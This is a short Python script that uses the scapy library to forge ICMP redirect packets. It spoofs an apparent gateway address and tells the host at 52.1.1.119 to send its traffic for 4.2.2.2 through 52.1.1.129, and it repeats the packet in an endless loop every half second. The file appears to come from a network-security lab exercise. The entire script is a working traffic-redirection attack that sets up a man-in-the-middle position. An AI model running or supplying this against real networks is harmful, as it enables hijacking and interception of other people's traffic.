from scapy.all import *

import time
ip=IP()
ip.src = '52.1.1.1'
ip.dst = '52.1.1.119'

icmp = ICMP()
icmp.type = 5
icmp.code = 0
icmp.gw = '52.1.1.129'

ip2=IP()
ip2.src = '52.1.1.119'
ip2.dst = '4.2.2.2'
while 1:
    send(ip/icmp/ip2/ICMP())
    time.sleep(0.5)